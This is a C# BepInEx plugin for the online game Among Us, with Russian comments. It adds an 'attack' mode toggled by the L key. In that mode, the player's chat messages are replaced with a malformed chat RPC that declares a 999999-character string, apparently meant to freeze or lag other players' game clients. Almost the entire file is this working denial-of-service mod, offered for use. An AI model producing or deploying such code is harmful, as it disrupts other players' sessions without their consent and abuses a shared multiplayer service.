using BepInEx;
using BepInEx.Logging;
using HarmonyLib;
using System;
using AmongUs.GameOptions;
using Hazel;
using UnityEngine;

namespace AmongUsLagMod
{
    // Атрибут BepInPlugin остается тем же
    [BepInPlugin(PLUGIN_GUID, PLUGIN_NAME, PLUGIN_VERSION)]
    // Наследуемся от BasePlugin вместо BaseUnityPlugin
    public class Plugin : BasePlugin
    {
        public const string PLUGIN_GUID = "com.yourname.amonguslagmod";
        public const string PLUGIN_NAME = "Among Us Lag Mod";
        public const string PLUGIN_VERSION = "1.0.0";

        // BasePlugin имеет свое собственное свойство Log
        // Нет нужды создавать статическое поле и присваивать ему base.Logger
        // public static ManualLogSource Log; // <-- Больше не нужно

        private readonly Harmony harmony = new Harmony(PLUGIN_GUID);

        // Переключатель для активации "атаки"
        public static bool IsLagEnabled = false;

        // Вместо Awake() используем Load()
        // Load() вызывается, когда плагин загружается BepInEx
        public override void Load()
        {
            // Используем свойство Log из BasePlugin
            Log.LogInfo($"Плагин {PLUGIN_NAME} загружен!");

            // Применяем патчи
            harmony.PatchAll();

            // Обработка ввода теперь немного сложнее, так как нет прямого доступа к MonoBehaviour.
            // Самый простой способ - создать отдельный класс-компонент для этого.
            // Но для простоты можно оставить это здесь, если BepInEx 6 предоставляет удобный менеджер.
            // В BepInEx 6 InputManager все еще можно использовать, но правильнее будет вынести это в отдельный компонент.
            // Для примера оставим как есть, но имейте в виду, что это может потребовать доработок.
            if (InputManager.Exists)
            {
                InputManager.Instance.AddKeyDownAction(KeyCode.L, () => {
                    IsLagEnabled = !IsLagEnabled;
                    Log.LogInfo($"Режим зависания: {(IsLagEnabled ? "ВКЛ" : "ВЫКЛ")}");
                });
            }
            else
            {
                Log.LogWarning("InputManager не найден. Управление с клавиатуры не будет работать.");
            }
        }

        // Также можно переопределить Unload() для очистки ресурсов, если это необходимо
        public override void Unload()
        {
            harmony.UnpatchSelf();
            Log.LogInfo($"Плагин {PLUGIN_NAME} выгружен.");
            base.Unload();
        }
    }

    // Класс с патчами остается без изменений
    [HarmonyPatch]
    internal static class Patches
    {
        [HarmonyPatch(typeof(PlayerControl), nameof(PlayerControl.RpcSendChat))]
        [HarmonyPrefix]
        private static bool RpcSendChat_Prefix(PlayerControl __instance, string chatText)
        {
            if (!Plugin.IsLagEnabled)
            {
                return true;
            }

            // Для логирования из статического класса нужно получить доступ к логгеру плагина.
            // Один из способов - передать его в конструктор, но проще сделать его публичным статическим.
            // В данном примере мы оставим логирование в основном классе плагина.
            // Если нужно здесь, можно сделать Log в Plugin публичным статическим.
            // Plugin.Log.LogWarning("Перехват отправки чата..."); // <-- так сработает, если Log в Plugin публичный

            MessageWriter writer = AmongUsClient.Instance.StartRpc(__instance.NetId, (byte)RpcCalls.SendChat);
            int maliciousStringLength = 999999;
            writer.Write(maliciousStringLength);
            writer.EndMessage();
            
            return false;
        }
    }
}
